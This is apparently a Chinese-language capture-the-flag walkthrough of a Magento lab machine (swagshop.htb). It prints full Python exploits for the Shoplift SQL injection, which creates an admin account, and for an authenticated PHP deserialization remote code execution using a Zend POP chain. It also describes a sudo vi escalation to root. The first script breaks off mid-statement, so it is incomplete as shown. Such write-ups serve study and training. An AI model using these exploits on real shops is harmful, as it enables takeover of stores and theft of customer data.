Phase 1

漏洞一：Magento Shoplift (SUPEE-5344) — SQL 注入创建管理员

🧒 助记：偷渡建户 通过 SQL 注入偷偷在数据库里建一个管理员账号。Magento 的 Cms_Wysiwyg/directive 端点没有做输入过滤，攻击者可以在 filter 参数中注入完整的 SQL 语句——INSERT 一个新的 admin 用户。

Python3 Exploit

#!/usr/bin/env python3
# Magento Shoplift exploit (SUPEE-5344) — Python 3 Port

import requests
import base64
import sys

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <target_url>")
    sys.exit(1)

target = sys.argv[1].rstrip("/")
target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

q = """
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,
`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`)
VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL,NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name)
VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{query}"
pfilter_encoded = base64.b64encode(pfilter.encode()).decode()

r = requests.post(target_url, data={
    "___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
    "filter": pfilter_encoded, "forwarded": 1

if r.status_code == 200:

Phase 2

漏洞二：Magento CE < 1.9.0.1 认证后反序列化 RCE

获取 install_date（签名密钥）

http://swagshop.htb/app/etc/local.xml
<install>
  <date>Wed, 08 May 2019 07:23:09 +0000</date>
</install>
🧒 为什么 install_date 必须正确？——对暗号 exploit 生成 URL 时计算 md5(base64_payload + install_date) 作为签名。服务器用自己存储的 install_date 做同样的哈希校验，不匹配则拒绝执行。install_date 本质上充当了一个共享密钥——暗号不对就拒绝执行。

完整 Exploit（Python3，含 POP 链）

#!/usr/bin/env python3
# Magento CE < 1.9.0.1 Post Auth RCE

import sys, re, base64, hashlib, requests

target = sys.argv[1]
arg = sys.argv[2]

username = 'forme'
password = 'forme'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'

# Zend_Log POP chain — triggers php_function(arg) on deserialization
payload_template = (
    'O:8:"Zend_Log":1:{s:11:"\x00*\x00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{'
    's:16:"\x00*\x00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";'
    'i:2;s:15:"EXTERMINATE!!!!";}s:22:"\x00*\x00_subjectPrependText";N;s:10:"\x00*\x00_layout";'
    'O:23:"Zend_Config_Writer_Yaml":3:{s:15:"\x00*\x00_yamlEncoder";s:%d:"%s";s:17:'
    '"\x00*\x00_loadedSection";N;s:10:"\x00*\x00_config";O:13:"Varien_Object":1:{s:8:'
    '"\x00*\x00_data";s:%d:"%s";}}s:8:"\x00*\x00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}'
)
payload = payload_template % (len(php_function), php_function, len(arg), arg)

session = requests.Session()
login_page = session.get(target)
session.post(target, data={'login[username]': username, 'login[password]': password})
content = session.get(target).text

url = re.search(r"ajaxBlockUrl = '(.*)'", content).group(1)
key = re.search(r"var FORM_KEY = '(.*)'", content).group(1)

r = session.post(f"{url}block/tab_orders/period/7d/?isAjax=true",
                 data={'isAjax': 'false', 'form_key': key})
tunnel = re.search(r'src="(.*)\?ga=', r.text).group(1)

payload_b64 = base64.b64encode(payload.encode()).decode()
gh = hashlib.md5((payload_b64 + install_date).encode()).hexdigest()

result = session.get(f"{tunnel}?ga={payload_b64}&h={gh}")
print(result.text)

知识点总结

Magento Shoplift (SUPEE-5344) 是经典的 SQL 注入建管理员。

通过 Cms_Wysiwyg/directive 端点注入 INSERT 语句，无需认证即可创建后台管理员账号。搜索 searchsploit magento 就能找到。

install_date 是 Magento RCE 的「对暗号」环节。

exploit 用 md5(payload + install_date) 做签名校验。从 /app/etc/local.xml 读取正确的 install_date 是 exploit 成功的前提。

PHP 反序列化 POP 链是高级 Web 攻击的核心。

Zend_Log → Zend_Config_Writer_Yaml → Varien_Object 的链条最终调用 system(arg)。不需要手动构造——公开 exploit 已经包含完整链条。

sudo vi/vim 是 GTFOBins 经典提权。

:set shell=/bin/sh + :shell 两步拿 root。任何以 root 运行且能启动子进程的编辑器（vi、vim、nano、less、man）都可以用这个方法。

SQLi 建管理员→反序列化 RCE→www-data→sudo vi → :shell → root
